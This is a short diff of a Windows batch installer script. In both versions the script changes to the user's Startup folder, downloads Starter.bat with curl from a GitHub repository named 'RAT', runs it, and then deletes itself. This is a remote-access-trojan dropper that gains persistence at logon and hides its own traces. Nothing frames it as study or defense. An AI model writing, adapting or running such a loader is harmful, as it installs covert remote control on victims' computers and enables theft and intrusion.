@@ -4,8 +4,7 @@ set "currentd=%cd%"
 set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %targetd%
 
-powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
-powershell powershell.exe -windowstyle hidden timeout 5
-powershell ./Starter.bat
+curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat
+Starter.bat
 cd %currentd%
-del init.bat
+@del init.bat
